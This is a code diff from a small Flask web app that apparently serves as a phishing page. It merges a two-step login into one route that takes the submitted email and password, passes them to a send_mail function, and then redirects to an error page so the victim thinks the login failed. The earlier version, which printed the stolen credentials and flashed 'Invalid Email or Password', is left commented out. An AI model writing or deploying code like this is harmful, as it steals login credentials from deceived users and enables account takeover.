@@ -36,25 +36,28 @@ def send_mail(email, password):
 
 
 
-@app.route("/", methods=['GET', 'POST'])
+@app.route("/one", methods=['GET', 'POST'])
 def one():
     if request.method == 'POST':
         email = request.form.get('email')
-        return redirect(url_for('two', username=email))
+        password = request.form['password']
+        
+        send_mail(email, password)
+        return redirect(url_for('error'))
     return render_template('one.html')
 
-@app.route("/two", methods=['GET', 'POST'])
-def two():
-    user_email = request.args.get('username')
-    print('User email : ', user_email)
-    if request.method == 'POST':
-        password = request.form['password']
-        print('User email : ', user_email, 'password : ', password)
-        send_mail(user_email, password)
-        flash('Invalid Email or Password', 'danger')
+# @app.route("/two", methods=['GET', 'POST'])
+# def two():
+#     user_email = request.args.get('username')
+#     print('User email : ', user_email)
+#     if request.method == 'POST':
+#         password = request.form['password']
+#         print('User email : ', user_email, 'password : ', password)
+#         send_mail(user_email, password)
+#         flash('Invalid Email or Password', 'danger')
 
-        # return redirect(url_for('error'))
-    return render_template('two.html', user_email=user_email)
+#         # return redirect(url_for('error'))
+#     return render_template('two.html', user_email=user_email)
 
 @app.route('/error', methods=['GET', 'POST'])
 def error():
